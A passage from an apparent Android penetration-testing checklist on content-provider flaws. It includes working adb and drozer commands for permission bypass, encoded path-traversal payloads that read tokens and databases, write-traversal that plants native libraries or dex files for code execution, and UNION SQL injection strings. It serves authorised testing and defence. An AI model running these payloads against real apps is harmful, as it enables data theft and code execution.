| **Maps to** | MASTG-TEST-0355 (the Sieve example); HackTricks `drozer-tutorial/exploiting-content-providers.md` — "the path `/Keys/` is accessible ... which is not protected due to a mistake by the developer, who secured `/Keys` but declared `/Keys/`" |

- **Test:** The canonical provider bug and still a live one. A `<path-permission android:path="/Keys">`
  protects exactly `/Keys`. `/Keys/` is a different string, matches a different `UriMatcher` arm, and is
  served unprotected.
- **How:**
```bash
adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Keys
adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Keys/
```
```
# the canonical output pair
Keys   -> java.lang.SecurityException: Permission Denial: ...
Keys/  -> Row: 0 Password=1234567890AZERTYUIOPazertyuiop, pin=1234
```
- **Proof:** Both commands' outputs in the report. Nothing else is needed — the delta is self-evidently the
  bug.
- **Escalation:** Always attempt the **write** through whichever variant granted read
  (`content update --bind password:s:...`). That single extra command is the difference between a Medium
  information disclosure and a Critical account takeover.
- **Ruled out when:** Both forms return the same `Permission Denial`, and the same is true for the other
  variants in D07-019. One form tested is not a test.

### D07-019 · `UriMatcher` normalisation variant fuzz

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | sec-88 "Content Provider Hacking" Case 1 (permission bypass by appending `/////`); MASTG-TECH-0163 |

- **Test:** Never treat an authority as one object. `addURI()` patterns and the permission-checking branch
  are hand-written by different people at different times and routinely cover different sets. Every
  redundant separator, dot segment, case change and encoded separator is a candidate for falling through to
  an unguarded arm.
- **How:** For every discovered path, emit the full variant set:
```
/keys      /keys/     /keys//    /keys/////   /keys/1    /KEYS
/keys/x    /./keys    /keys/.    /keys/../keys            //keys
/%6beys    /keys%2f   /keys?     /keys#
```
```bash
for v in keys "keys/" "keys//" "keys/////" "keys/1" KEYS "keys/x" "./keys" "keys/../keys"; do
  printf '%-28s ' "$v"
  adb shell content query --uri "content://com.target.app.provider/$v" 2>&1 | head -1
done
```
  Use the Python harness in D07-008 for anything wider than this; count the probes.
- **Proof:** One variant returning rows while the canonical path returns `Permission Denial`. Paste both.
- **Escalation:** Escalate read -> write through the permissive variant; that is the Critical.
- **Ruled out when:** Every variant returns the same AMS-layer denial, from an app UID, with the probe count
  matching the variant count.

### D07-020 · `getCallingPackage()` versus `getCallingPackageUnchecked()`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | providers that authorise on the caller's identity |
| **Maps to** | AOSP `ContentProvider.java` javadoc: `getCallingPackage()` — "The returned package will have been verified to belong to the calling UID"; `getCallingPackageUnchecked()` — "will have **not** been verified" |

- **Test:** A provider that self-authorises using `getCallingPackageUnchecked()` (or the package name out of
  a `Bundle` extra, or `getCallingAttributionSource().getPackageName()` without validating it) accepts an
  attacker-declared identity. The two method names differ by one word and the javadoc difference is the
  whole security property.
- **How:**
```bash
grep -rnE 'getCallingPackageUnchecked|getCallingPackage\(\)|getCallingAttributionSource|getCallingUid|Binder\.getCallingUid' out/sources/
# for each hit, read the branch it gates
grep -rn -B4 -A20 'getCallingPackageUnchecked' out/sources/
```
  Then call from a stub that names the privileged package in whatever channel the provider reads
  (an extra, an attribution tag, a `call()` bundle key).
- **Proof:** The decompiled authorisation branch keyed on the unchecked variant, plus the privileged branch
  taken by your stub — show the data the branch returns.
- **Escalation:** Provider authorisation bypass; combine with D07-014 for the `call()` surface.
- **Ruled out when:** Every identity decision is made on `Binder.getCallingUid()` or on
  `getCallingPackage()` whose result is then checked against a signature (`PackageManager.checkSignatures`
  / `GET_SIGNING_CERTIFICATES`), and no package name arrives in caller-controlled data.

### D07-021 · `grantUriPermissions="true"` with no `<grant-uri-permission>` restriction

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 (needs a grant primitive from D08) |
| **Applies to** | all |
| **Maps to** | `guide/topics/manifest/provider-element`: if `"true"`, permission is grantable to any data in the provider, overriding the other permission attributes; if `"false"`, only the subsets in `<grant-uri-permission>` may be granted |

- **Test:** `grantUriPermissions="true"` at provider level means *any* URI under the authority can be handed
  out temporarily, regardless of `permission`/`readPermission`/`writePermission`. That attribute plus a
  broad backing directory is the payload half of every URI-grant chain. `<grant-uri-permission
  android:pathPattern=".*">` or `android:path="/"` is the same thing written the long way.
- **How:**
```bash
grep -nE 'grantUriPermissions|<grant-uri-permission' -A4 out/AndroidManifest.xml
grep -rnE 'FLAG_GRANT_READ_URI_PERMISSION|FLAG_GRANT_WRITE_URI_PERMISSION|FLAG_GRANT_PERSISTABLE_URI_PERMISSION|FLAG_GRANT_PREFIX_URI_PERMISSION|grantUriPermission\(|setClipData\(' out/sources/
adb shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p'
```
- **Proof:** `dumpsys activity permissions` listing a live grant to your PoC package for a URI outside the
  intended scope, plus a successful `content read` on it.
- **Escalation:** -> D08 intent redirection is the delivery vehicle; the paths XML (D07-054) sets the blast
  radius. File the grant-config observation as the primitive and the redirection as the consumer (D07-074).
- **Ruled out when:** `grantUriPermissions="false"` (or absent) and no `<grant-uri-permission>` child exists
  — then grants are impossible for that authority and the provider's declared permissions are the whole
  story.

### D07-022 · `exported="false"` plus `grantUriPermissions="true"` is reachable, not closed

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | Oversecured "Gaining access to arbitrary Content Providers"; `risks/intent-redirection` |

- **Test:** The single most common wrongly-recorded negative in this domain. A redirected or echoed Intent
  carrying `FLAG_GRANT_READ_URI_PERMISSION` / `FLAG_GRANT_WRITE_URI_PERMISSION` reaches a non-exported
  provider, because the grant transfers the *victim's* access with no consent prompt. Never write a
  non-exported provider into the ruled-out register without checking `grantUriPermissions` first.
- **How:**
```bash
grep -nE 'grantUriPermissions' out/AndroidManifest.xml
# find any component that echoes or forwards an attacker-supplied Intent
grep -rnE 'setResult\(|startActivity\(.*getIntent|startActivityForResult\(.*getParcelableExtra|PendingIntent\.(getActivity|getService|getBroadcast)' out/sources/
```
  Then run the D08 laundering PoC: your activity sends the victim an Intent it forwards back with the grant
  flags set and a `data` URI under the non-exported authority.
- **Proof:** `openInputStream()` on the non-exported authority succeeding in your PoC after the round trip,
  where the same call before the round trip threw `SecurityException`. Both calls in one logcat capture.
- **Escalation:** -> D08 for the redirector; -> D07-054 for what the grant then reaches.
- **Ruled out when:** `grantUriPermissions` is false/absent on that authority **and** no component forwards
  an attacker Intent **and** no `PendingIntent` is handed out with a mutable base Intent.

### D07-023 · `FLAG_GRANT_PREFIX_URI_PERMISSION` grants the subtree, not the file

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03/AM-04 |
| **Applies to** | all |
| **Maps to** | MASWE-0018 (CWE-940) — "over-broad or persistable URI permission grants ... where one-time, scoped sharing would suffice"; `content/Intent.java` grant flag constants |

- **Test:** An app that shares one photo with `FLAG_GRANT_PREFIX_URI_PERMISSION` has shared the directory.
  After receiving any grant, always probe siblings before concluding the share was scoped.
- **How:**
```bash
grep -rn 'FLAG_GRANT_PREFIX_URI_PERMISSION' out/sources/
# receive a legitimate share, then walk sideways
adb shell content read --uri 'content://com.target.app.fileprovider/shared/IMG_0001.jpg'   # the granted one
adb shell content read --uri 'content://com.target.app.fileprovider/shared/IMG_0002.jpg'   # a sibling
adb shell content read --uri 'content://com.target.app.fileprovider/shared/../cache/x'     # up a level
adb shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p'
```
- **Proof:** Bytes returned for a sibling URI you were never explicitly granted, with `dumpsys` showing a
  single prefix grant as the source.
- **Escalation:** The wider the prefix, the closer it gets to D07-054 arbitrary read. Combine with an
  implicit chooser recipient (D05) and the grant reaches an arbitrary installed app.
- **Ruled out when:** Grants are issued per-URI with no prefix flag, and a sibling probe returns
  `SecurityException` while the granted URI reads.

### D07-024 · Persistable grants survive reboot and the user's "delete"

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) |
| **Attacker** | AM-03/AM-04, recipient of a legitimate share |
| **Applies to** | all with SAF / share flows |
| **Maps to** | MASWE-0018; `takePersistableUriPermission`; HackTricks `intent-injection.md` (`0x43` = READ `0x1` + WRITE `0x2` + PERSISTABLE `0x40`) |

- **Test:** The corpus covers `takePersistableUriPermission` only defensively; nobody tests **retention**.
  When the app hands out `FLAG_GRANT_PERSISTABLE_URI_PERMISSION`, the recipient keeps access across reboots
  and across the user deleting the item in the UI, until the app explicitly calls `revokeUriPermission` or
  is uninstalled. For a document the user believes is revocable — a contract, an ID scan, a medical report,
  a "disappearing" message — the finding is that delete does not delete.
- **How:**
```java
getContentResolver().takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION);
```
```bash
grep -rnE 'FLAG_GRANT_PERSISTABLE_URI_PERMISSION|takePersistableUriPermission|revokeUriPermission' out/sources/
adb reboot && adb wait-for-device
adb shell dumpsys activity providers | sed -n '/Granted Uri Permissions/,/^$/p'
# then delete the item in the target app's UI and re-read from the PoC
```
- **Proof:** `dumpsys` listing the persisted grant to your package after reboot, plus your PoC still
  reading the bytes after the user deleted the item. Capture the UI state and the read together.
- **Escalation:** -> D20 data retained beyond the user's control. Note honestly that the grant dies on
  uninstall of the providing app.
- **Ruled out when:** The app never sets the persistable flag, or it calls `revokeUriPermission` on delete
  and your post-delete read throws `SecurityException`.

### D07-025 · `openFile()` / `openAssetFile()` / `openTypedAssetFile()` path traversal

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1); fallback `server_security_misconfiguration.path_traversal` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | all providers implementing any `open*` method |
| **Maps to** | MASTG-TECH-0159; MASWE-0050; `risks/path-traversal`; CVE-2025-48636 (`openFile` of `BugreportContentProvider.java`, read+write of unauthorised files, CVSS 8.4); CVE-2024-43089 and CVE-2023-35670 (MediaProvider `openFile` traversal) |

- **Test:** The provider builds a `File` from a URI path segment and returns a `ParcelFileDescriptor`
  without canonicalising. Three entry points, not one: `openFile`, `openAssetFile` and
  `openTypedAssetFile` — apps override different ones and testers only send the first.
- **How:** The vulnerable shape:
```java
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    File root = new File(getContext().getFilesDir(), "my_files");
    File file = new File(root, uri.getPath());              // no canonicalisation
    return ParcelFileDescriptor.open(file, MODE_READ_ONLY);
}
```
```bash
grep -rn -A25 'public ParcelFileDescriptor openFile\|openAssetFile\|openTypedAssetFile\|openFileHelper' out/sources/
grep -rn 'getCanonicalPath\|getCanonicalFile' out/sources/    # ABSENCE is the finding
adb shell content read --uri 'content://com.target.app.provider/../../shared_prefs/auth.xml'
adb shell content read --uri 'content://com.target.app.provider/files/../../databases/app.db' | head -c 64 | xxd
```
```java
getContentResolver().openInputStream(Uri.parse(
    "content://com.target.app.provider/../../shared_prefs/secrets.xml"));
```
- **Proof:** The literal bytes of a victim-private file: `<map><string name="access_token">eyJ...` from
  `shared_prefs`, or the magic `SQLite format 3` from `databases/`. Hexdump the first 16 bytes so the
  triager can see it is the real file, and contrast an identical direct `open()` from your UID failing with
  `EACCES`.
- **Escalation:** -> D11 for what the file holds, -> D13/D15 for the token. If the mode string permits `w`,
  go to D07-032 and then -> D17 code execution.
- **Ruled out when:** The provider extends AndroidX `FileProvider` unmodified (it canonicalises and throws
  `IllegalArgumentException: Failed to find configured root that contains ...`), **or** the custom
  implementation calls `getCanonicalPath()` and compares with `startsWith(root.getCanonicalPath())` before
  opening — show the decompiled check, and show your `../` probe hitting it.

### D07-026 · The `%2F` decode mismatch — `Uri` accessors decode after the string check

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | all — every Android version |
| **Maps to** | Oversecured "Content Providers and the potential weak spots they can have" (§Path Traversal via Uri Decoding) and "Android security checklist: theft of arbitrary files"; the Google app `CommonContentProvider` case; MASWE-0050 |

- **Test:** `Uri.getPath()`, `Uri.getLastPathSegment()` and `Uri.getPathSegments()` return **decoded**
  values. A developer who rejects a literal `../` in the raw URI string, or who "validated" that the
  segment contains no `/`, is bypassed by `..%2F` — because the decode happens *after* their check and
  *before* the `File` constructor. This is the single highest-hit-rate provider bug, and the plain-versus-
  encoded differential is itself the proof that the decode order is the defect.
- **How:**
```bash
grep -rnE 'getLastPathSegment\(\)|getPathSegments\(\)|uri\.getPath\(\)' out/sources/ \
  | grep -iE 'new File\(|openFile|FileInputStream|FileOutputStream|ParcelFileDescriptor\.open'
# real-world shape (Google app CommonContentProvider):
#   return ParcelFileDescriptor.open(new File(i, uri.getLastPathSegment()),
#          ParcelFileDescriptor.parseMode(str.toLowerCase(Locale.getDefault())));
adb shell content read --uri 'content://com.target.app.provider/..%2F..%2Fshared_prefs%2Fauth.xml'
adb shell content read --uri 'content://com.target.app.provider/..%2Fdatabases%2Fapp.db' > app.db
```
  The safe forms to grep for are `getEncodedPath()` or canonicalise-then-`startsWith(base)`.
- **Proof:** The encoded form returning file content while the plain `../` form is rejected. Both outputs
  together; that differential is the finding, not just the read.
- **Escalation:** The same decode-order mistake recurs in deep-link and intent-redirection URI validation
  -> D08, D09. With `mode="w"` -> D07-032 -> D17.
- **Ruled out when:** The provider uses `getEncodedPath()`/`getEncodedLastPathSegment()` and validates before
  decoding, or canonicalises after decoding — and both the plain and encoded probes are rejected with the
  same exception.

### D07-027 · Depth sweep with harmless canaries before you touch real data

| | |
|---|---|
| **Severity ceiling** | Support (Critical once pivoted) |
| **VRT** | n/a (technique) |
| **Attacker** | AM-03 |
| **Applies to** | all file-backed providers |
| **Maps to** | drozer `scanner.provider.traversal`, `app.provider.read` |

- **Test:** Traversal depth is not statically knowable — it depends on where the provider's root sits.
  Sweep depths 1..8 with a file that exists everywhere and whose content is unmistakable, so the positive
  is unambiguous *and* the PoC is harmless. Then pivot the winning depth to real data.
- **How:**
```bash
for i in 1 2 3 4 5 6 7 8; do
  P=$(python3 -c "print('../'*$i)")
  echo "== depth $i"; adb shell content read --uri "content://com.target.app.provider/${P}proc/version" 2>&1 | head -2
done
# encoded form of the same sweep
adb shell content read --uri "content://com.target.app.provider/..%2F..%2F..%2Fproc/version"
# pivot at the winning depth
adb shell content read --uri "content://com.target.app.provider/../../../data/data/com.target.app/shared_prefs/auth.xml"
```
- **Proof:** `Linux version 5.x ... gcc ...` at a given depth. `/proc/version` is still readable on API 30+
  and is the best first canary. `/etc/hosts` (`127.0.0.1 localhost`) is the second — but **some OEM SELinux
  policies block it**, so a failure there is a policy result, not an app result. Say which canary you used.
- **Escalation:** Pivot the same depth to `shared_prefs/*.xml` and `databases/*.db` — that pivot is what
  makes it a report rather than a curiosity.
- **Ruled out when:** All eight depths and both encodings return `FileNotFoundException` or
  `IllegalArgumentException: Failed to find configured root`, and the canonicalisation check from D07-025
  is present in the decompiled source.

### D07-028 · Infer file-backed versus SQLite-backed before you fuzz

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (triage control) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | drozer `app.provider.read`/`download` error shape: `java.io.FileNotFoundException: No files supported by provider at content://...` |

- **Test:** An authority that resolves but where every `content query` fails is almost always an `openFile`
  provider. Feeding it SQL injection payloads burns an hour and produces a false negative for the domain.
  Classify first, then choose the attack.
- **How:**
```bash
adb shell content query --uri content://com.target.app.provider/x 2>&1 | head -2
adb shell content read  --uri content://com.target.app.provider/x 2>&1 | head -2
adb shell content gettype --uri content://com.target.app.provider/x
grep -rn 'public Cursor query(\|public ParcelFileDescriptor openFile(\|extends FileProvider\|extends DocumentsProvider' out/sources/
```

| Signature | Classification | Go to |
|---|---|---|
| `query` returns rows or an SQLite error | SQLite-backed | D07-035 |
| `query` returns `null`/empty, `read` returns bytes or `FileNotFoundException` naming a path | file-backed | D07-025 |
| `java.io.FileNotFoundException: No files supported by provider at ...` | cursor-only | D07-035, not traversal |
| class extends `DocumentsProvider` | SAF | D07-061 |
| class extends `SliceProvider` | Slice | D07-063 |

- **Proof:** The classification plus the command output that produced it, recorded per authority.
- **Escalation:** Routes the rest of the domain; a misclassification is how testers miss the Critical.
- **Ruled out when:** n/a — classification always produces a result.

### D07-029 · The encoding-variant matrix the scanners never send

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | all file-backed providers |
| **Maps to** | drozer `scanner/provider/traversal.py` source (one fixed payload); Oversecured file-theft checklist |

- **Test:** Naive `contains("..")` filters, single-pass `replace("../","")` sanitisers and decode-order bugs
  each fall to a different encoding. Send the matrix, not one payload.
- **How:**
```bash
TARGET='data/data/com.target.app/shared_prefs/auth.xml'
for P in \
  "../../$TARGET" \
  "..%2F..%2F$TARGET" \
  "%2e%2e%2f%2e%2e%2f$TARGET" \
  "....//....//$TARGET" \
  "..%252F..%252F$TARGET" \
  "..%c0%af..%c0%af$TARGET" \
  "a/../../../$TARGET" \
  "./../../$TARGET" ; do
  printf '%-40s ' "${P:0:38}"
  adb shell content read --uri "content://com.target.app.provider/$P" 2>&1 | head -c 120; echo
done
```
  `....//` defeats a single-pass strip; `%252F` defeats a double-decode; a leading real segment (`a/../`)
  defeats prefix checks that only inspect the first segment.
- **Proof:** The variant that returns bytes, alongside the variants that were rejected. The comparison
  demonstrates the specific sanitiser flaw, which is what the fix must address.
- **Escalation:** -> D07-032 write side; -> D11/D13 for the payload.
- **Ruled out when:** All eight variants are rejected at both `read` and `write` modes and the
  canonicalisation check is visible in source.

### D07-030 · Never accept `scanner.provider.traversal` reporting "Not Vulnerable"

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (false-negative control) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | drozer `scanner/provider/traversal.py`, read directly: it calls `contentResolver().read(uri + "/../../../../../../../../../../../../../../../../etc/hosts")` and flags the URI **only** if the returned data is non-empty |

- **Test:** The scanner sends exactly one payload against exactly one file, with a fixed 16-level prefix and
  a non-empty-read oracle. Every one of D07-029's variants, every depth other than 16, and every target
  other than `/etc/hosts` is invisible to it — and on images where `/etc/hosts` is unreadable or empty, its
  only oracle silently reads zero.
- **How:**
```bash
drozer> run scanner.provider.traversal -a com.target.app
drozer> run scanner.provider.traversal --uri content://com.target.app.provider/files
# then the manual probes it cannot perform
drozer> run app.provider.read content://<auth>/..%2f..%2f..%2fdata/data/com.target.app/shared_prefs/auth.xml
drozer> run app.provider.read content://<auth>/....//....//....//data/data/com.target.app/files/token
drozer> run app.provider.read content://<auth>/%2e%2e/%2e%2e/%2e%2e/data/data/com.target.app/databases/app.db
drozer> run app.provider.download content://<auth>/a/../../../../data/data/com.target.app/files/x /tmp/x
```
- **Proof:** A manual probe returning file content for a URI the scanner listed under `Not Vulnerable:`.
  Put both outputs side by side — the false negative is itself worth documenting for the client.
- **Escalation:** -> D07-025.
- **Ruled out when:** n/a. Tool output is never a ruled-out basis; only the manual matrix plus the source
  check is.

### D07-031 · `openFile()` that ignores the `mode` argument

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | all providers implementing `openFile` |
| **Maps to** | Oversecured "Permission Mismatch in File Access" / "Incorrect Permission Declaration"; `guide/topics/manifest/provider-element` |

- **Test:** The framework checks the caller's requested **mode** against the read or the write permission,
  then hands the mode string to the provider. Two failures follow. (a) The provider hardcodes
  `MODE_READ_ONLY` / `268435456` and ignores `mode`, so a caller who opens `"w"` is checked against the
  *write* permission — which may be absent — and then receives a descriptor they can read from. (b) The
  provider honours whatever mode it is given on a path it should only ever read, so a read-protected file
  becomes writable through the weaker guard.
- **How:**
```bash
grep -rn -A12 'public ParcelFileDescriptor openFile' out/sources/
grep -rnE 'ParcelFileDescriptor\.open|parseMode|MODE_READ_WRITE|MODE_WRITE_ONLY|268435456|1006632960' out/sources/
```
```java
// read the file through the WRITE-permission code path
ParcelFileDescriptor pfd = getContentResolver().openFile(uri, "w", null);
InputStream in = new FileInputStream(pfd.getFileDescriptor());
```
```bash
adb shell content write --uri 'content://com.target.app.provider/config' < attacker.json
adb shell content read  --uri 'content://com.target.app.provider/config'
```
- **Proof:** The read succeeding through a write-mode request on a provider whose read is denied, or a write
  succeeding on a URI whose `readPermission`/`<path-permission>` implies read-only — verified by reading the
  file back and seeing your bytes.
- **Escalation:** Write access to app-private config is a foothold -> D17; combine with D07-019 to locate
  the branch on which the asymmetry exists.
- **Ruled out when:** `openFile` calls `ParcelFileDescriptor.parseMode(mode)` and the provider declares a
  single `android:permission` covering both directions, and your `"w"` probe throws `SecurityException`.

### D07-032 · Write-mode traversal into a code-load path

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) once execution is demonstrated; `server_security_misconfiguration.path_traversal` (VARIES) for the write alone |
| **Attacker** | AM-03 |
| **Applies to** | providers whose `open*` honours a write mode |
| **Maps to** | CVE-2025-48636; Oversecured `TheftOverwriteProvider` (OVAA); Google Mobile VRP: "Path traversal / zip path traversal vulnerabilities leading to arbitrary file write" — and the explicit rule that "if you do not demonstrate this [ACE] in your report, the reward amount will not reflect this" |

- **Test:** The same primitive as D07-025 in the other direction. The write alone underpays; plan the
  write-then-load chain from the start. Enumerate what the app loads before you choose a destination.
- **How:**
```bash
# 1. find the loaders
grep -rnE 'System\.load\(|System\.loadLibrary\(|DexClassLoader|PathClassLoader|InMemoryDexClassLoader|createPackageContext' out/sources/
adb shell run-as com.target.app ls -la lib/ lib-main/ files/ code_cache/ app_dex/ 2>/dev/null
# 2. write through the traversal
adb shell 'content write --uri "content://com.target.app.provider/files/..%2Flib%2Fpwn.so"' < pwn.so
adb shell 'content write --uri "content://com.target.app.provider/files/../code_cache/plugin.dex"' < plugin.dex
# 3. prove the write
adb shell run-as com.target.app ls -l lib/ code_cache/
# 4. prove execution — restart and catch JNI_OnLoad / static initialiser
adb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1
adb logcat -s pwn:V
```
- **Proof:** Your file at the traversed path (`run-as ls -l` on a debuggable build, or a root `ls` on the
  research device with the mtime change), then a log line emitted by your own `JNI_OnLoad` or static
  initialiser on next launch. On a non-debuggable release build, prove it by the behaviour change instead
  and say which you used.
- **Escalation:** -> D17 persistent code execution in the victim's UID. This is the Google Mobile VRP's
  top-paying category; file the write as the primitive and the ACE as the consumer (D07-074).
- **Ruled out when:** Every `open*` method opens with a fixed read-only mode *and* the canonicalisation
  check is present, so both the `"w"` probe and the traversal probe fail.

### D07-033 · `openFileHelper()` and the `_data` column — insert your own path, then open it

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | providers using `openFileHelper()` or a `_data`-style path column |
| **Maps to** | HackTricks `content-protocol.md` (seeding MediaStore's `_data` column and reading it back); MASTG-TECH-0148 |

- **Test:** `ContentProvider.openFileHelper(uri, mode)` opens whatever path sits in the row's `_data`
  column. If the provider also accepts `insert`/`update` on that column, the traversal is not in the URI at
  all — you write the absolute path into the row and then open it. This bypasses every URI-level
  canonicalisation the app might have.
- **How:**
```bash
grep -rn 'openFileHelper\|"_data"\|MediaStore.MediaColumns.DATA' out/sources/
# seed a path, then open it
adb shell content insert --uri content://com.target.app.provider/files \
  --bind _data:s:/data/data/com.target.app/shared_prefs/auth.xml --bind mime_type:s:text/plain
adb shell content query --uri content://com.target.app.provider/files --projection "_id,_data" | tail -3
adb shell content read --uri content://com.target.app.provider/files/<returned_id>
# the MediaStore analogue, for the cross-provider version of the same trick
adb shell 'cd /sdcard && echo "hello" > t.txt'
adb shell content insert --uri content://media/external/file --bind _data:s:/storage/emulated/0/t.txt --bind mime_type:s:text/plain
adb shell content query  --uri content://media/external/file --projection _id,_data | grep t.txt
```
- **Proof:** A row you inserted whose `_data` names a victim-private path, followed by `content read` on
  that row's URI returning the file's bytes.
- **Escalation:** -> D07-025's impact set; the write form of the same trick (insert a `_data` pointing at a
  code path, then write through it) -> D07-032 -> D17.
- **Ruled out when:** `openFileHelper` is not used, or `insert`/`update` reject or overwrite `_data` (show
  the decompiled `ContentValues` sanitisation and a failed insert).

### D07-034 · Symlink and TOCTOU against the provider's own canonicalisation

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) |
| **Attacker** | AM-03/AM-04 |
| **Applies to** | providers that canonicalise once and open later |
| **Maps to** | `risks/content-resolver` (documented symlink-targeting and check/open race); Google VRP remediation tip: "Verify that the canonical path ... right before doing file operations ... Watch out for TOCTOU issues. Symlinks can change at any time." |

- **Test:** A provider that calls `getCanonicalPath()`, validates the prefix, and *then* opens the file has
  a window. An attacker who controls the path (because it lives on shared storage, or in a directory the
  attacker can write) swaps a benign file for a symlink between the check and the open. The correct
  defence is an `fstat` on the returned descriptor compared against an `lstat` of the canonical path.
- **How:**
```bash
grep -rn -A15 'getCanonicalPath' out/sources/ | grep -nE 'ParcelFileDescriptor\.open|FileInputStream|Os\.fstat|Os\.lstat|S_ISLNK'
adb shell 'ln -s /data/data/com.target.app/shared_prefs/auth.xml /sdcard/Android/data/com.poc/files/pic.jpg'
adb shell content read --uri 'content://com.target.app.provider/external/pic.jpg'
```
  The documented safe form, whose **absence** is the detection signature:
```kotlin
val fdCanonical = File(fileUri.path!!).canonicalPath
val pfdStat: StructStat = Os.fstat(pfd.fileDescriptor)
val canonicalFileStat: StructStat = Os.lstat(fdCanonical)
if (OsConstants.S_ISLNK(canonicalFileStat.st_mode)) return false
val sameFile = pfdStat.st_dev == canonicalFileStat.st_dev && pfdStat.st_ino == canonicalFileStat.st_ino
```
- **Proof:** The provider returning the symlink target's bytes. For the race, loop the swap and show a
  non-zero hit rate over n>=10 attempts with the hit count reported (D07-046 applies).
- **Escalation:** -> D07-025 impact; the write direction -> D17.
- **Ruled out when:** The provider performs the `fstat`/`lstat`/`S_ISLNK` comparison, or it only ever opens
  paths under a directory no other app can write (internal storage, no `<external-path>` entry).

### D07-035 · Provider `selection` SQL injection — make the error hand you the query

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.sql_injection` (P1) — note it is defined server-side; file the closest accurate node and request the severity |
| **Attacker** | AM-03 |
| **Applies to** | all SQLite-backed providers |
| **Maps to** | MASTG-TEST-0339, MASTG-TEST-0025, MASWE-0050 (CWE-89, CWE-20), MASTG-KNOW-0117, rule `mastg-android-sql-injection-contentprovider.yml`, MASTG-TOOL-0110; H1 #291764 (Nextcloud, Low 0.9, $150), #1650264 (ownCloud, Medium 4.2, GHSL-2022-059), #887968 (Mail.ru `ru.mail.data.contact.ContactsProvider`), #143280 (Mail.ru, $250) |

- **Test:** Establish that your string reaches SQL, then break it. A vulnerable provider's error leaks the
  real table name, the full column list **and the parenthesisation of the provider's own `WHERE` wrapper**
  — so you get the UNION column count without blind counting. Do the oracle step first; it makes every
  later payload cheap.
- **How:**
```bash
A=content://com.target.app.provider/notes/
# 1. does it reach SQL at all?
adb shell content query --uri $A --where "_id=1"
# 2. break it
adb shell content query --uri $A --where "'"
# 3. UNION, balancing the provider's own "WHERE (" wrapper
adb shell content query --uri $A --where "_id=1=1)union select 1,2,3,4,sqlite_version(),6,7,8 from sqlite_master where (1=1"
adb shell content query --uri $A --where "_id=1=1)union select 1,2,3,4,tbl_name,6,7,8 from sqlite_master where (1=1"
adb shell content query --uri $A --where "_id=1=1)union select 1,2,3,4,sql,6,7,8 from sqlite_master where (1=1"
# generic boolean form when the wrapper shape is unknown
adb shell content query --uri $A --where "1=1) OR (1=1"
adb shell content query --uri $A --where "1=2 UNION SELECT * FROM Sensitive -- "
# static sink
grep -rnE 'rawQuery\(|execSQL\(|SQLiteQueryBuilder|appendWhere\(|"\s*\+\s*selection' out/sources/
grep -rn 'selectionArgs\|setStrict\|setProjectionMap' out/sources/   # absence is the bug
```
  `SQLiteQueryBuilder.appendWhere()` inserts its argument **verbatim** and is not parameterised;
  `appendWhereEscapeString` is the safe variant.
- **Proof:** The literal error, quoted:
  `unrecognized token: "')" (code 1): , while compiling: SELECT _id,title,body,created FROM notes WHERE (')`
  followed by UNION output containing `sqlite_master` rows
  (`Row: 0 type=table, name=users, sql=CREATE TABLE users (...)`). Schema output is not obtainable without
  injection, which is why it is the cleanest demonstration.
- **Escalation:** Dump the credential/session table, then write back through `content update` on the same
  path (D07-039) — read plus write is the Critical.
- **Ruled out when:** Every caller-supplied string is passed through `selectionArgs` with `?` placeholders,
  **and** the quote probe returns rows or a clean empty cursor rather than a parser error, **and**
  `setStrictColumns`/`setStrictGrammar` or a `setProjectionMap` is present. Note the reachability
  qualifier: the same concatenation reachable only through the app's own UI is Low — you are injecting into
  your own database.

### D07-036 · Projection injection is a separate sink from selection

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.sql_injection` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | all SQLite-backed providers |
| **Maps to** | MASTG-TEST-0339; drozer `scanner.provider.injection` classification `Injection in Projection`; sec-88 "Content Provider Hacking" §2 Case 1 |

